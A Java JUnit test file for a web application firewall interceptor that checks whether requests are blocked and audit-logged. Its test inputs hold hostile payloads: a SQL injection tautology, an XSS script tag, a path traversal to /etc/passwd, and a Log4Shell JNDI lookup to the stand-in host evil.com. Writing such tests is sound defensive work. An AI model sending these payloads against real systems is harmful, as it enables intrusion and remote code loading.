package com.ghatana.security.interceptor;

import com.ghatana.security.audit.SecurityAuditLogger;
import com.ghatana.platform.testing.activej.EventloopTestBase;
import io.activej.http.HttpMethod;
import io.activej.http.HttpRequest;
import io.activej.http.HttpResponse;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;

/**
 * @doc.type class
 * @doc.purpose Tests OWASP WAF filtering rules
 * @doc.layer product
 * @doc.pattern Test
 */
@DisplayName("WafInterceptor Tests")
class WafInterceptorTest extends EventloopTestBase {

    private final SecurityAuditLogger auditLogger = mock(SecurityAuditLogger.class);
    private final WafInterceptor waf = new WafInterceptor(auditLogger, true);

    private final SecurityInterceptor.NextHandler passThrough =
            req -> io.activej.promise.Promise.of(HttpResponse.ok200().build());

    @Test
    @DisplayName("should allow clean requests")
    void shouldAllowCleanRequest() {
        HttpRequest clean = HttpRequest.builder(HttpMethod.GET, "http://localhost/api/v1/collections")
                .build();
        HttpResponse response = runPromise(() -> waf.intercept(clean, passThrough));
        assertThat(response.getCode()).isEqualTo(200);
        verify(auditLogger, never()).logSecurityEvent(eq("WAF_BLOCKED"), any(), any());
    }

    @Test
    @DisplayName("should block SQL injection in query string")
    void shouldBlockSqlInjection() {
        // Pattern matches: ' or '1'='1  (SQL boolean tautology)
        HttpRequest sqli = HttpRequest.builder(HttpMethod.GET,
                "http://localhost/api/v1/search?q=' OR '1'='1").build();
        HttpResponse response = runPromise(() -> waf.intercept(sqli, passThrough));
        assertThat(response.getCode()).isEqualTo(403);
        verify(auditLogger).logSecurityEvent(eq("WAF_BLOCKED"), any(), eq("SQL_INJECTION"));
    }

    @Test
    @DisplayName("should block XSS in path")
    void shouldBlockXss() {
        HttpRequest xss = HttpRequest.builder(HttpMethod.GET,
                "http://localhost/api/v1/<script>alert(1)</script>").build();
        HttpResponse response = runPromise(() -> waf.intercept(xss, passThrough));
        assertThat(response.getCode()).isEqualTo(403);
        verify(auditLogger).logSecurityEvent(eq("WAF_BLOCKED"), any(), eq("XSS"));
    }

    @Test
    @DisplayName("should block path traversal")
    void shouldBlockPathTraversal() {
        HttpRequest traversal = HttpRequest.builder(HttpMethod.GET,
                "http://localhost/api/v1/files/../../etc/passwd").build();
        HttpResponse response = runPromise(() -> waf.intercept(traversal, passThrough));
        assertThat(response.getCode()).isEqualTo(403);
        verify(auditLogger).logSecurityEvent(eq("WAF_BLOCKED"), any(), eq("PATH_TRAVERSAL"));
    }

    @Test
    @DisplayName("should block Log4Shell injection")
    void shouldBlockLog4Shell() {
        HttpRequest jndi = HttpRequest.builder(HttpMethod.GET,
                "http://localhost/api/v1/lookup?name=${jndi:ldap://evil.com/a}").build();
        HttpResponse response = runPromise(() -> waf.intercept(jndi, passThrough));
        assertThat(response.getCode()).isEqualTo(403);
        verify(auditLogger).logSecurityEvent(eq("WAF_BLOCKED"), any(), eq("LOG4SHELL"));
    }

    @Test
    @DisplayName("should pass through when disabled")
    void shouldPassThroughWhenDisabled() {
        WafInterceptor disabled = new WafInterceptor(auditLogger, false);
        HttpRequest sqli = HttpRequest.builder(HttpMethod.GET,
                "http://localhost/api?q=' OR '1'='1").build();
        HttpResponse response = runPromise(() -> disabled.intercept(sqli, passThrough));
        assertThat(response.getCode()).isEqualTo(200);
    }
}
